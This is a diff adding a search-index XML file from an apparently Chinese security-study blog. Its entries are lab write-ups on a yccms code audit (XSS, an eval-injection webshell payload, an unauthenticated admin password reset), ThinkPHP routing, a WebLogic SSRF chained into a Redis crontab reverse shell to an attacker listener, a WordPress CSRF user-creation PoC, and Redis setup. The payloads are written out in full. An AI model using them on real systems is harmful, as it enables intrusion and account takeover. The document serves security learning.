@@ -1,0 +1,231 @@
+<?xml version="1.0" encoding="utf-8"?>
+<search>
+  <entry>
+    <title>001-yccms代码审计</title>
+    <url>/2022/07/24/001-yccms%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/</url>
+    <content><![CDATA[<h3 id="xss漏洞"><a href="#xss漏洞" class="headerlink" title="xss漏洞"></a>xss漏洞</h3><p>seay进行漏洞检测发现xss漏洞，此处原本不叫1.php，是乱码名称的php文件，为了演示，特此改名。</p>
+<p><img src="/2022/07/24/001-yccms%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/image-20220725123257358.png" alt="image-20220725123257358"></p>
+<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> <span class="keyword">if</span> (<span class="variable">$_GET</span>[<span class="string">&#x27;art&#x27;</span>]): <span class="meta">?&gt;</span></span><br><span class="line">&lt;dd&gt;&lt;span <span class="class"><span class="keyword">class</span>=&quot;<span class="title">state</span>&quot;&gt;内容生成完毕 !共 &lt;?<span class="title">php</span> <span class="title">echo</span> $<span class="title">_GET</span>[&#x27;<span class="title">art</span>&#x27;]; ?&gt;</span></span><br><span class="line"><span class="class"> 条。&lt;/<span class="title">span</span>&gt;&lt;/<span class="title">dd</span>&gt;</span></span><br></pre></td></tr></table></figure>
+
+<p>网站测试：</p>
+<figure class="highlight html"><table><tr><td class="code"><pre><span class="line">/compile/1.php?art=<span class="tag">&lt;<span class="name">script</span>&gt;</span>alert(1);<span class="tag">&lt;/<span class="name">script</span>&gt;</span>  </span><br></pre></td></tr></table></figure>
+
+<p>发现漏洞确实存在</p>
+<p><img src="/2022/07/24/001-yccms%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/image-20220725123120708.png" alt="image-20220725123120708"></p>
+<h3 id="命令执行漏洞"><a href="#命令执行漏洞" class="headerlink" title="命令执行漏洞"></a>命令执行漏洞</h3><p>&#x2F;public&#x2F;class&#x2F;Factory.class.php</p>
+<p><img src="/2022/07/24/001-yccms%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/image-20220725123936319.png" alt="image-20220725123936319"></p>
+<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Factory</span></span>&#123;</span><br><span class="line">	<span class="built_in">static</span> <span class="keyword">private</span> <span class="variable">$_obj</span>=<span class="literal">null</span>;</span><br><span class="line">	<span class="built_in">static</span> <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">setAction</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">		<span class="variable">$_a</span>=<span class="built_in">self</span>::<span class="title function_ invoke__">getA</span>();</span><br><span class="line">		<span class="keyword">if</span> (<span class="title function_ invoke__">in_array</span>(<span class="variable">$_a</span>, <span class="keyword">array</span>(<span class="string">&#x27;admin&#x27;</span>, <span class="string">&#x27;nav&#x27;</span>, <span class="string">&#x27;article&#x27;</span>,<span class="string">&#x27;backup&#x27;</span>,<span class="string">&#x27;html&#x27;</span>,<span class="string">&#x27;link&#x27;</span>,<span class="string">&#x27;pic&#x27;</span>,<span class="string">&#x27;search&#x27;</span>,<span class="string">&#x27;system&#x27;</span>,<span class="string">&#x27;xml&#x27;</span>,<span class="string">&#x27;online&#x27;</span>))) &#123;</span><br><span class="line">			<span class="keyword">if</span> (!<span class="keyword">isset</span>(<span class="variable">$_SESSION</span>[<span class="string">&#x27;admin&#x27;</span>])) &#123;</span><br><span class="line">				<span class="title function_ invoke__">header</span>(<span class="string">&#x27;Location:&#x27;</span>.<span class="string">&#x27;?a=login&#x27;</span>);</span><br><span class="line">			&#125;</span><br><span class="line">		&#125;</span><br><span class="line">		<span class="keyword">if</span> (!<span class="title function_ invoke__">file_exists</span>(ROOT_PATH.<span class="string">&#x27;/controller/&#x27;</span>.<span class="title function_ invoke__">ucfirst</span>(<span class="variable">$_a</span>).<span class="string">&#x27;Action.class.php&#x27;</span>)) <span class="variable">$_a</span> = <span class="string">&#x27;Login&#x27;</span>;</span><br><span class="line">		<span class="keyword">eval</span>(<span class="string">&#x27;self::$_obj = new &#x27;</span>.<span class="title function_ invoke__">ucfirst</span>(<span class="variable">$_a</span>).<span class="string">&#x27;Action();&#x27;</span>);</span><br><span class="line">		<span class="keyword">return</span> <span class="built_in">self</span>::<span class="variable">$_obj</span>;</span><br><span class="line">	&#125;</span><br><span class="line">	</span><br><span class="line">	<span class="built_in">static</span> <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">setModel</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">		<span class="variable">$_a</span> = <span class="built_in">self</span>::<span class="title function_ invoke__">getA</span>();</span><br><span class="line">		<span class="keyword">if</span> (<span class="title function_ invoke__">file_exists</span>(ROOT_PATH.<span class="string">&#x27;/model/&#x27;</span>.<span class="variable">$_a</span>.<span class="string">&#x27;Model.class.php&#x27;</span>)) <span class="keyword">eval</span>(<span class="string">&#x27;self::$_obj = new &#x27;</span>.<span class="title function_ invoke__">ucfirst</span>(<span class="variable">$_a</span>).<span class="string">&#x27;Model();&#x27;</span>);</span><br><span class="line">		<span class="keyword">return</span> <span class="built_in">self</span>::<span class="variable">$_obj</span>;</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="built_in">static</span> <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">getA</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">		<span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;a&#x27;</span>]) &amp;&amp; !<span class="keyword">empty</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;a&#x27;</span>]))&#123;</span><br><span class="line">			<span class="keyword">return</span> <span class="variable">$_GET</span>[<span class="string">&#x27;a&#x27;</span>];</span><br><span class="line">		&#125;</span><br><span class="line">		<span class="keyword">return</span> <span class="string">&#x27;login&#x27;</span>;</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
+
+<p>getA()：如果get方式传入a值 且a不为空 则会返回a 赋值给$_a</p>
+<p>ucfirst()：首字母大写</p>
+<p>file_exits()：函数允许路径中存在特殊字符，有..&#x2F;会返回上级目录，此处可以通过目录穿越绕过if判断，使$_a不为Login，而是我们传入的值，然后通过eval代码执行达到利用</p>
+<p>要想执行eval，去哪儿调用？ucfirst前有一个 new，说明实例化了一个对象，我们也可以实例化Factory()</p>
+<p>构造： Factory();phpinfo();&#x2F;&#x2F;..&#x2F;</p>
+<p>ROOT_PATH&#x2F;model&#x2F;**Factory();phpinfo();&#x2F;&#x2F;..&#x2F;**Model.class.php</p>
+<p>路径相当于：ROOT_PATH&#x2F;model&#x2F;Model.class.php「确实存在」</p>
+<p>命令相当于phpinfo()，后面内容被&#x2F;&#x2F;注释了</p>
+<p>要让某处调用Factory()这个类 发现&#x2F;config&#x2F;run.inc.php调用了Factory() 。查找包含&#x2F;config&#x2F;run.inc.php的文件：&#x2F;admin&#x2F;index.php &#x2F;config&#x2F;count.php &#x2F;search&#x2F;index.php</p>
+<p>构造payload：<a href="http://localhost/yccms/config/count.php?a=Factory();@eval($_POST%5B1%5D);//../">http://localhost/yccms/config/count.php?a=Factory();@eval($_POST[1]);//../</a></p>
+<p>使用其他三个文件包含也行</p>
+<h3 id="任意密码修改"><a href="#任意密码修改" class="headerlink" title="任意密码修改"></a>任意密码修改</h3><p> &#x2F;controller&#x2F;AdminAction.class.php</p>
+<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="comment">//修改密码</span></span><br><span class="line">	<span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">update</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">		<span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;send&#x27;</span>]))&#123;</span><br><span class="line">			<span class="keyword">if</span>(validate::<span class="title function_ invoke__">isNullString</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;username&#x27;</span>])) <span class="title class_">Tool</span>::<span class="title function_ invoke__">t_back</span>(<span class="string">&#x27;用户名不能为空&#x27;</span>,<span class="string">&#x27;?a=admin&amp;m=update&#x27;</span>);</span><br><span class="line">			<span class="keyword">if</span>(validate::<span class="title function_ invoke__">isNullString</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;password&#x27;</span>])) <span class="title class_">Tool</span>::<span class="title function_ invoke__">t_back</span>(<span class="string">&#x27;密码不能为空!&#x27;</span>,<span class="string">&#x27;?a=admin&amp;m=update&#x27;</span>);</span><br><span class="line">			<span class="keyword">if</span>(!(validate::<span class="title function_ invoke__">checkStrEquals</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;password&#x27;</span>], <span class="variable">$_POST</span>[<span class="string">&#x27;notpassword&#x27;</span>]))) <span class="title class_">Tool</span>::<span class="title function_ invoke__">t_back</span>(<span class="string">&#x27;两次密码不一致!&#x27;</span>,<span class="string">&#x27;?a=admin&amp;m=update&#x27;</span>);</span><br><span class="line">			<span class="variable language_">$this</span>-&gt;_model-&gt;username=<span class="variable">$_POST</span>[<span class="string">&#x27;username&#x27;</span>];</span><br><span class="line">			<span class="variable language_">$this</span>-&gt;_model-&gt;password=<span class="title function_ invoke__">sha1</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;password&#x27;</span>]);</span><br><span class="line">			<span class="variable">$_edit</span>=<span class="variable language_">$this</span>-&gt;_model-&gt;<span class="title function_ invoke__">editAdmin</span>();</span><br><span class="line">			<span class="keyword">if</span>(<span class="variable">$_edit</span>)&#123;</span><br><span class="line">				tool::<span class="title function_ invoke__">layer_alert</span>(<span class="string">&#x27;密码修改成功!&#x27;</span>,<span class="string">&#x27;?a=admin&amp;m=update&#x27;</span>,<span class="number">6</span>);</span><br><span class="line">				&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">				tool::<span class="title function_ invoke__">layer_alert</span>(<span class="string">&#x27;密码未修改!&#x27;</span>,<span class="string">&#x27;?a=admin&amp;m=update&#x27;</span>,<span class="number">6</span>);</span><br><span class="line">			&#125;</span><br><span class="line">		&#125;</span><br></pre></td></tr></table></figure>
+
+<p>验证用户名和密码不为空，两次密码是否输入一致，但没有对用户身份进行验证。跟踪editAdmin()函数，是一个sql语句</p>
+<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">editAdmin</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">		<span class="variable">$_sql</span>=<span class="string">&quot;UPDATE</span></span><br><span class="line"><span class="string">					my_admin</span></span><br><span class="line"><span class="string">				SET</span></span><br><span class="line"><span class="string">					username=&#x27;<span class="subst">$this</span>-&gt;username&#x27;,</span></span><br><span class="line"><span class="string">					password=&#x27;<span class="subst">$this</span>-&gt;password&#x27;</span></span><br><span class="line"><span class="string">				WHERE</span></span><br><span class="line"><span class="string">					id=1</span></span><br><span class="line"><span class="string">				LIMIT 1&quot;</span>;</span><br><span class="line">		<span class="keyword">return</span> <span class="built_in">parent</span>::<span class="title function_ invoke__">update</span>(<span class="variable">$_sql</span>);</span><br><span class="line">	&#125;</span><br></pre></td></tr></table></figure>
+
+<p>update的一个操作，对用户传入的参数没有进行过滤。任意用户可以修改管理员密码，进入&#x2F;admin后台，默认账密admin&#x2F;admin</p>
+<p><img src="/2022/07/24/001-yccms%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/image-20220725181602475.png" alt="image-20220725181602475"></p>
+<p>后台没有校验原密码功能，通过该页面的抓包可以直接在bp端修改密码「用这段流量包，即使不登录admin后台，也可以越权修改任意密码」</p>
+<p><img src="/2022/07/24/001-yccms%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/image-20220725182455517.png" alt="image-20220725182455517"></p>
+<figure class="highlight http"><table><tr><td class="code"><pre><span class="line"><span class="keyword">POST</span> <span class="string">/yccms/admin/?a=admin&amp;m=update</span> <span class="meta">HTTP/1.1</span></span><br><span class="line"><span class="attribute">Host</span><span class="punctuation">: </span>192.168.2.152</span><br><span class="line"><span class="attribute">Content-Length</span><span class="punctuation">: </span>91</span><br><span class="line"><span class="attribute">Cache-Control</span><span class="punctuation">: </span>max-age=0</span><br><span class="line"><span class="attribute">Upgrade-Insecure-Requests</span><span class="punctuation">: </span>1</span><br><span class="line"><span class="attribute">Origin</span><span class="punctuation">: </span>http://192.168.2.152</span><br><span class="line"><span class="attribute">Content-Type</span><span class="punctuation">: </span>application/x-www-form-urlencoded</span><br><span class="line"><span class="attribute">User-Agent</span><span class="punctuation">: </span>Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/103.0.0.0 Safari/537.36</span><br><span class="line"><span class="attribute">Accept</span><span class="punctuation">: </span>text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9</span><br><span class="line"><span class="attribute">Referer</span><span class="punctuation">: </span>http://192.168.2.152/yccms/admin/?a=admin&amp;m=update</span><br><span class="line"><span class="attribute">Accept-Encoding</span><span class="punctuation">: </span>gzip, deflate</span><br><span class="line"><span class="attribute">Accept-Language</span><span class="punctuation">: </span>zh-CN,zh;q=0.9</span><br><span class="line"><span class="attribute">Cookie</span><span class="punctuation">: </span>PHPSESSID=5kcd7pa4vav814dflgppq42oj3</span><br><span class="line"><span class="attribute">Connection</span><span class="punctuation">: </span>close</span><br><span class="line"></span><br><span class="line"><span class="language-llvm">username<span class="operator">=</span>admin&amp;password<span class="operator">=</span><span class="number">123111</span>&amp;notpassword<span class="operator">=</span><span class="number">123111</span>&amp;send<span class="operator">=</span><span class="variable">%E4</span><span class="variable">%BF</span><span class="variable">%AE</span><span class="variable">%E6</span><span class="variable">%94</span><span class="variable">%B9</span><span class="variable">%E5</span><span class="variable">%AF</span><span class="variable">%86</span><span class="variable">%E7</span><span class="variable">%A0</span><span class="variable">%81</span></span></span><br></pre></td></tr></table></figure>
+
+]]></content>
+      <categories>
+        <category>代码审计</category>
+      </categories>
+  </entry>
+  <entry>
+    <title>002-thinkphp5.0.22代码审计</title>
+    <url>/2022/07/25/002-thinkphp5-0-22%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/</url>
+    <content><![CDATA[<p>MVC结构 代码审计重点关注controller目录</p>
+<h6 id="漏洞成因：未开启强制路由，开启兼容模式"><a href="#漏洞成因：未开启强制路由，开启兼容模式" class="headerlink" title="漏洞成因：未开启强制路由，开启兼容模式"></a>漏洞成因：未开启强制路由，开启兼容模式</h6><p>URL&amp;路由</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">http://servername/index.php/模块/控制器/操作/参数名/参数值</span><br><span class="line">http://servername/index.php/index/hello_world/index/name/123</span><br></pre></td></tr></table></figure>
+
+<p>模块：index </p>
+<p>控制器：hello_world「不能将控制器的名字写成HelloWorld，控制器会自动转换为小写」</p>
+<h6 id="参数传入"><a href="#参数传入" class="headerlink" title="参数传入"></a>参数传入</h6><p>①<a href="http://servername/index.php/%E6%A8%A1%E5%9D%97/%E6%8E%A7%E5%88%B6%E5%99%A8/%E6%93%8D%E4%BD%9C/%E5%8F%82%E6%95%B0%E5%90%8D1/%E5%8F%82%E6%95%B0%E5%80%BC1/%E5%8F%82%E6%95%B0%E5%90%8D2/%E5%8F%82%E6%95%B0%E5%80%BC2">http://servername/index.php/模块/控制器/操作/参数名1/参数值1/参数名2/参数值2</a></p>
+<p>②<a href="http://servername/index.php/%E6%A8%A1%E5%9D%97/%E6%8E%A7%E5%88%B6%E5%99%A8/%E6%93%8D%E4%BD%9C?%E5%8F%82%E6%95%B01=%E5%80%BC1&amp;%E5%8F%82%E6%95%B02=%E5%80%BC2">http://servername/index.php/模块/控制器/操作?参数1=值1&amp;参数2=值2</a></p>
+<p>入口文件：&#x2F;public&#x2F;index.php</p>
+<p>执行应用文件：&#x2F;thinkphp&#x2F;start.php</p>
+<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="comment">// ThinkPHP 引导文件</span></span><br><span class="line"><span class="comment">// 加载基础文件</span></span><br><span class="line"><span class="keyword">require</span> <span class="keyword">__DIR__</span> . <span class="string">&#x27;/base.php&#x27;</span>;</span><br><span class="line"><span class="comment">// 执行应用</span></span><br><span class="line"><span class="title class_">App</span>::<span class="title function_ invoke__">run</span>()-&gt;<span class="title function_ invoke__">send</span>();</span><br></pre></td></tr></table></figure>
+
+<p>url传入经过路由检查-跟进routeCheck()</p>
+<p>判断路径是否为空，获取一个类似文件后缀名的$suffix，进入pathinfo()函数，判断是否是兼容格式，判断pathinfo是否为空，获取pathinfo的值，去掉特殊字符后返回pathinfo的值。config.php设置一些公共参数，usr_route_must为false，说明未强制使用路由。</p>
+<p>到此为止，s&#x3D;index&#x2F;think\app&#x2F;invok efunction的内容获取完毕。thinkphp会对&#x2F;进行替换，对think\app控制器的反斜杠不会替换，会用到这个控制器。  </p>
+<p>先找invokefunction函数-看哪里调用了，再进行利用。</p>
+]]></content>
+      <categories>
+        <category>代码审计</category>
+      </categories>
+  </entry>
+  <entry>
+    <title>weblogic-SSRF漏洞</title>
+    <url>/2022/07/27/weblogic-SSRF%E6%BC%8F%E6%B4%9E/</url>
+    <content><![CDATA[<span id="more"></span>
+
+<p>环境在&#x2F;vulhub&#x2F;weblogic&#x2F;ssrf</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">启动docker镜像：docker-compose up -d</span><br></pre></td></tr></table></figure>
+
+<p>一、访问url:7001&#x2F;uddiexplorer，点击search public registries</p>
+<p><img src="/2022/07/27/weblogic-SSRF%E6%BC%8F%E6%B4%9E/image-20220727200208141.png" alt="image-20220727200208141"></p>
+<p>二、填完信息后bp抓该页面的包</p>
+<img src="/2022/07/27/weblogic-SSRF%E6%BC%8F%E6%B4%9E/image-20220727200413263.png" alt="image-20220727200413263">
+
+<figure class="highlight html"><table><tr><td class="code"><pre><span class="line">POST /uddiexplorer/SearchPublicRegistries.jsp HTTP/1.1</span><br><span class="line">Host: 192.168.31.83:7001</span><br><span class="line">Content-Length: 175</span><br><span class="line">Cache-Control: max-age=0</span><br><span class="line">Upgrade-Insecure-Requests: 1</span><br><span class="line">Origin: http://192.168.31.83:7001</span><br><span class="line">Content-Type: application/x-www-form-urlencoded</span><br><span class="line">User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/103.0.0.0 Safari/537.36</span><br><span class="line">Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9</span><br><span class="line">Referer: http://192.168.31.83:7001/uddiexplorer/SearchPublicRegistries.jsp</span><br><span class="line">Accept-Encoding: gzip, deflate</span><br><span class="line">Accept-Language: zh-CN,zh;q=0.9,en;q=0.8</span><br><span class="line">Cookie: publicinquiryurls=http://www-3.ibm.com/services/uddi/inquiryapi!IBM|http://www-3.ibm.com/services/uddi/v2beta/inquiryapi!IBM V2|http://uddi.rte.microsoft.com/inquire!Microsoft|http://services.xmethods.net/glue/inquire/uddi!XMethods|; JSESSIONID=Qvy3vhpdqpTqJNndL99TV0vw6G37QTWDSdjpPqTPYScHnNcvjqgr!2026307918</span><br><span class="line">Connection: close</span><br><span class="line"></span><br><span class="line">operator=http%3A%2F%2Fwww-3.ibm.com%2Fservices%2Fuddi%2Finquiryapi&amp;rdoSearch=name&amp;txtSearchname=111&amp;txtSearchkey=222&amp;txtSearchfor=333&amp;selfor=Business+location&amp;btnSubmit=Search</span><br></pre></td></tr></table></figure>
+
+<p><strong>请求参数operator</strong>为一个url，此处可替换url，将url修改为自己搭建的服务器地址「本机docker的ip需要另外命令」，访问开放的7001端口，会返回一个状态码404，同网页访问一样。访问一个不存在的端口会返回连不上服务器。根据报错的不同，可以进行内网探测。通过ssrf探测内网中的redis服务器。</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">查看docker容器weblogic的ip</span><br><span class="line">第一种方法：</span><br><span class="line">进入docker：docker exec -it id /bin/bash</span><br><span class="line">ifconfig</span><br><span class="line">第二种方法：</span><br><span class="line">docker inspect 3d8272ebde6e</span><br></pre></td></tr></table></figure>
+
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">redis服务器ip：192.168.80.2</span><br><span class="line">weblogic服务器ip：192.168.80.3</span><br></pre></td></tr></table></figure>
+
+<p>把operator里的url改成想要探测的主机和端口<br>利用SSRF漏洞访问7001端口的weblogic服务，如果端口开启，会返回不一样的值：<strong>同网页端访问一样</strong></p>
+<p><img src="/2022/07/27/weblogic-SSRF%E6%BC%8F%E6%B4%9E/image-20220727211400220.png" alt="image-20220727211400220"></p>
+<p>利用SSRF漏洞访问6379端口的redis服务，如果端口开启，会返回不一样的值：<strong>have a valid SOAP content-type:null</strong></p>
+<p><img src="/2022/07/27/weblogic-SSRF%E6%BC%8F%E6%B4%9E/image-20220727211738562.png" alt="image-20220727211738562"></p>
+<h4 id="redis反弹shell"><a href="#redis反弹shell" class="headerlink" title="redis反弹shell"></a>redis反弹shell</h4><p>kali攻击机：192.168.100.136 监听端口：9001</p>
+<h5 id="攻击机kali开启监听"><a href="#攻击机kali开启监听" class="headerlink" title="攻击机kali开启监听"></a>攻击机kali开启监听</h5><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">nv -lvvp 9001</span><br></pre></td></tr></table></figure>
+
+<p>反弹shell</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">test</span><br><span class="line"></span><br><span class="line">set 1 &quot; \n\n\n\n* * * * * root bash -i &gt;&amp; /dev/tcp/192.168.100.136/9001 0&gt;&amp;1\n\n\n\n&quot;</span><br><span class="line"></span><br><span class="line">config set dir /etc/</span><br><span class="line"></span><br><span class="line">config set dbfilename crontab</span><br><span class="line"></span><br><span class="line">save</span><br><span class="line"></span><br><span class="line">aaa</span><br></pre></td></tr></table></figure>
+
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">url编码后：</span><br><span class="line">test%0A%0Aset%201%20%22%20%5Cn%5Cn%5Cn%5Cn*%20*%20*%20*%20*%20root%20bash%20-i%20%3E%26%20%2Fdev%2Ftcp%2F192.168.100.136%2F9001%200%3E%261%5Cn%5Cn%5Cn%5Cn%22%0A%0Aconfig%20set%20dir%20%2Fetc%2F%0A%0Aconfig%20set%20dbfilename%20crontab%0A%0Asave%0A%0Aaaa</span><br></pre></td></tr></table></figure>
+
+<p>将payload通过post方式用bp写入：<br>按理说攻击机的&#x2F;etc&#x2F;crontab内应该存在计划命令</p>
+<p><img src="/2022/07/27/weblogic-SSRF%E6%BC%8F%E6%B4%9E/image-20220728093308227.png" alt="image-20220728093308227"></p>
+<h5 id="bp发包"><a href="#bp发包" class="headerlink" title="bp发包"></a>bp发包</h5><p>攻击机等待1min，成功弹回shell</p>
+<p><img src="/2022/07/27/weblogic-SSRF%E6%BC%8F%E6%B4%9E/image-20220728093216497.png" alt="image-20220728093216497"></p>
+<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="comment">#bug</span></span><br><span class="line">不知道为啥，计划任务里没有命令！但是shell能成功反弹！！！无解「被卡住半天」</span><br></pre></td></tr></table></figure>
+
+<p>解答：该计划任务是写在docker的redis服务器上的</p>
+<img src="/2022/07/27/weblogic-SSRF%E6%BC%8F%E6%B4%9E/image-20220728094933099.png" alt="image-20220728094933099" style="zoom:50%;">
+]]></content>
+      <categories>
+        <category>漏洞利用</category>
+      </categories>
+      <tags>
+        <tag>SSRF</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>wordpress4.7.4-CSRF漏洞利用</title>
+    <url>/2022/07/26/wordpress4.7.4-CSRF%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8/</url>
+    <content><![CDATA[<h5 id="wp搭站注意事项："><a href="#wp搭站注意事项：" class="headerlink" title="wp搭站注意事项："></a>wp搭站注意事项：</h5><p>访问&#x2F;wp-admin&#x2F;setup-config.php<br>用小皮先另外创建一个数据库 配置要和wp-config-sample.php里的一样<br>ps:让wordpress在使用时可以使用本机ip而不是跳转到locolhost 可以在网页后台-设置中修改wordpress的url</p>
+<h3 id="CSRF漏洞"><a href="#CSRF漏洞" class="headerlink" title="CSRF漏洞"></a>CSRF漏洞</h3><p>一般配合其他漏洞一起使用</p>
+<p>登入后台添加用户 并用bp抓到该包</p>
+<p><img src="/2022/07/26/wordpress4.7.4-CSRF%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8/image-20220726204043588.png" alt="image-20220726204043588"></p>
+<figure class="highlight html"><table><tr><td class="code"><pre><span class="line">POST /wp-admin/user-new.php HTTP/1.1</span><br><span class="line">Host: 192.168.2.152</span><br><span class="line">Content-Length: 294</span><br><span class="line">Cache-Control: max-age=0</span><br><span class="line">Upgrade-Insecure-Requests: 1</span><br><span class="line">Origin: http://192.168.2.152</span><br><span class="line">Content-Type: application/x-www-form-urlencoded</span><br><span class="line">User-Agent: Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/103.0.0.0 Safari/537.36</span><br><span class="line">Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9</span><br><span class="line">Referer: http://192.168.2.152/wp-admin/user-new.php</span><br><span class="line">Accept-Encoding: gzip, deflate</span><br><span class="line">Accept-Language: zh-CN,zh;q=0.9</span><br><span class="line">Cookie: wordpress_2955eff27f5512f077181f8a53586cff=admin%7C1659008999%7CYtqStGYf7tqI9iH9Nxz87TB3I7sSHZEA0BImQuSUCsV%7Cbafcabf0c7516a0d7584294b213bebac18be2f9a52986aa523296d7015a0f785; wordpress_test_cookie=WP+Cookie+check; wordpress_logged_in_2955eff27f5512f077181f8a53586cff=admin%7C1659008999%7CYtqStGYf7tqI9iH9Nxz87TB3I7sSHZEA0BImQuSUCsV%7Cbca2f323399dc9bd026c666b701cc77df6199d55d86893f1950eca6f3485ea92; wp-settings-time-1=1658836304</span><br><span class="line">Connection: close</span><br><span class="line"></span><br><span class="line">action=createuser&amp;_wpnonce_create-user=79f9ee6f11&amp;_wp_http_referer=%2Fwp-admin%2Fuser-new.php&amp;user_login=1&amp;email=1%401.com&amp;first_name=&amp;last_name=&amp;url=&amp;pass1=123123&amp;pass1-text=123123&amp;pass2=123123&amp;pw_weak=on&amp;send_user_notification=1&amp;role=subscriber&amp;createuser=%E6%B7%BB%E5%8A%A0%E7%94%A8%E6%88%B7</span><br></pre></td></tr></table></figure>
+
+<p>对request右键Engagement tools-Generate CSRF PoC 生成csrf利用的一个html文档</p>
+<p><img src="/2022/07/26/wordpress4.7.4-CSRF%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8/image-20220726195423580.png" alt="image-20220726195423580"></p>
+<p>修改一下注册的用户名和邮箱，避免重复<br><img src="/2022/07/26/wordpress4.7.4-CSRF%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8/image-20220726195632659.png" alt="image-20220726195632659"></p>
+<p>改完之后点击regenerate重新生成。本地测试点击test in browser，实战时诱导管理员点击按钮「发恶意链接给对方」，便可成功利用csrf漏洞创建新用户</p>
+<p><img src="/2022/07/26/wordpress4.7.4-CSRF%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8/image-20220726201201402.png" alt="image-20220726201201402"></p>
+<p><img src="/2022/07/26/wordpress4.7.4-CSRF%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8/image-20220726201123150.png" alt="image-20220726201123150"></p>
+]]></content>
+      <categories>
+        <category>漏洞利用</category>
+      </categories>
+      <tags>
+        <tag>漏洞利用</tag>
+        <tag>CSRF</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>搭建redis-redis未授权访问</title>
+    <url>/2022/07/27/%E6%90%AD%E5%BB%BAredis-server-redis%E6%9C%AA%E6%8E%88%E6%9D%83%E8%AE%BF%E9%97%AE/</url>
+    <content><![CDATA[<h4 id="redis-server搭建"><a href="#redis-server搭建" class="headerlink" title="redis-server搭建"></a>redis-server搭建</h4><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">wget http://download.redis.io/releases/redis-2.8.17.tar.gz</span><br><span class="line">tar xzf redis-2.8.17.tar.gz</span><br><span class="line">cd redis-2.8.17</span><br><span class="line">make</span><br><span class="line">关闭客户端：redis-cli shutdown</span><br></pre></td></tr></table></figure>
+
+<h4 id="攻击机安装redis-cli远程连接工具"><a href="#攻击机安装redis-cli远程连接工具" class="headerlink" title="攻击机安装redis-cli远程连接工具"></a>攻击机安装redis-cli远程连接工具</h4><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">wget http://download.redis.io/redis-stable.tar.gz</span><br><span class="line">tar -zxvf redis-stable.tar.gz</span><br><span class="line">cd redis-stable</span><br><span class="line">make </span><br><span class="line">cp src/redis-cli /usr/bin/</span><br><span class="line">redis-cli -h</span><br></pre></td></tr></table></figure>
+
+<h5 id="服务端启动redis-server"><a href="#服务端启动redis-server" class="headerlink" title="服务端启动redis-server"></a>服务端启动redis-server</h5><p>修改redis.conf 添加：protected-mode no「关闭保护模式 protected-mode no 否则外部IP无法连接」</p>
+<img src="/2022/07/27/%E6%90%AD%E5%BB%BAredis-server-redis%E6%9C%AA%E6%8E%88%E6%9D%83%E8%AE%BF%E9%97%AE/image-20220727131302567.png" alt="image-20220727131302567" style="zoom:50%;">
+
